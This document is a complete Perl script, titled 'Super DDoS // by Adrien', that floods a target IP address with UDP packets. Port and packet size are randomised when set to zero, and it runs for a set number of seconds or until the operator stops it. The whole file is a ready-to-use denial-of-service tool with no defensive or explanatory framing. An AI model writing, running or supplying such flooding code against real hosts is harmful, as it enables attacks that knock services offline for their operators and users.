#!/usr/bin/perl
 
##############
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print " \n";
  print " Super DDoS // by Adrien\n\n";
  print " * Order: flood.pl <IP-address> <Port> <Packets> <Time (In seconds)>\n";
  print " - * Port: Port to flood. Set to 0 for all.\n";
  print " - * Packets: The number of packets to send. Between 64 and 1024.\n";
  print " - * Time: Flood time in seconds.\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Unable to connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print "Flooding in ongoing $ip with the port " . ($port ? $port : "random") . ", sends to " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Attack stopped with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
